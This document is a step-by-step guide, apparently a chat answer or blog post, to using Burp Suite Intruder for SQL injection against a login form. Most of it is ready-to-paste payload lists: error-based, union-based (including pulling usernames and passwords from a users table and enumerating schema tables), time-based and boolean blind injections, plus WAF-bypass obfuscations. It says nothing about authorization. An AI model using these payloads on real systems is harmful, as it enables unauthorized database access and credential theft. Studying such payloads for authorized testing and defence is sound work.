Tips for using **Burp Suite Intruder**, you can efficiently test for SQL Injection vulnerabilities. Below is an example payload setup for testing a login form.

---

### **Step-by-Step: Using Intruder for SQLi**
1. **Set the Intruder Attack:**
   - Right-click on the login request in the HTTP history and select `Send to Intruder`.
   - Go to the **Positions** tab, and set payload markers (`§`) around the parameters you want to test. For example:
     ```
     POST /login HTTP/1.1
     Host: target.com
     Content-Type: application/x-www-form-urlencoded

     user[email]=§test§&user[password]=§password§&authenticity_token=TOKEN
     ```

   - This example targets the `user[email]` and `user[password]` fields.

2. **Choose the Attack Type:**
   - Use the **Sniper** attack type if testing one parameter at a time.
   - Use the **Pitchfork** or **Cluster Bomb** if testing combinations of parameters.

---

### **Payloads for SQLi**
Below is a sample list of payloads for the **Intruder Payloads tab**. These payloads cover common SQLi techniques.

#### **1. Error-Based SQLi**
```plaintext
' OR 1=1--
" OR 1=1--
' OR '1'='1
" OR "1"="1
') OR ('1'='1
") OR ("1"="1
') OR 1=1--
") OR 1=1--
') OR 'a'='a'--
") OR "a"="a"--
```

#### **2. Union-Based SQLi**
```plaintext
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION ALL SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--
' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
```

#### **3. Time-Based Blind SQLi**
```plaintext
' OR IF(1=1,SLEEP(5),0)--
" OR IF(1=1,SLEEP(5),0)--
' AND IF(1=1,SLEEP(5),0)--
" AND IF(1=1,SLEEP(5),0)--
' AND SLEEP(5)--
" AND SLEEP(5)--
' OR SLEEP(5)--
" OR SLEEP(5)--
```

#### **4. Boolean-Based Blind SQLi**
```plaintext
' AND 1=1--
' AND 1=2--
' OR 'a'='a--
' OR 'a'='b--
" AND 1=1--
" AND 1=2--
" OR "a"="a--
" OR "a"="b--
```

---

### **Advanced Techniques**
#### **WAF Bypass Payloads**
Some WAFs block common SQLi patterns, so try obfuscation:
```plaintext
%27+OR+1%3D1--        (URL-encoded)
%27%20OR%201%3D1--    (URL-encoded with space)
'/**/OR/**/1=1--      (Inline comments)
' OR 1=CAST(1 AS SIGNED)--
' OR 1=CONVERT(1 USING latin1)--
```

#### **Custom Payloads**
Use dynamic payloads if you have insights about the database (e.g., MySQL, PostgreSQL):
```plaintext
' UNION SELECT NULL,USER()--   (MySQL)
' UNION SELECT VERSION(),NULL-- (MySQL)
' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
```

---

### **Configuring Burp Suite Intruder**
- **Payload Sets:** Copy and paste the above payloads into the payload list.
- **Request Throttling:** Use `Throttle` in `Options` if the server has rate-limiting.
- **Response Analysis:** Use the `Grep - Match` feature to look for SQL errors like:
  - `You have an error in your SQL syntax`
  - `ORA-00933: SQL command not properly ended`
  - `Microsoft OLE DB Provider for SQL Server`
  - `Unknown column`

---

### **Next Steps**
Once the attack runs, analyze the responses:
- Look for different response lengths or HTTP status codes.
- Identify response time delays for time-based SQLi.
- Use the results to refine and escalate your testing.

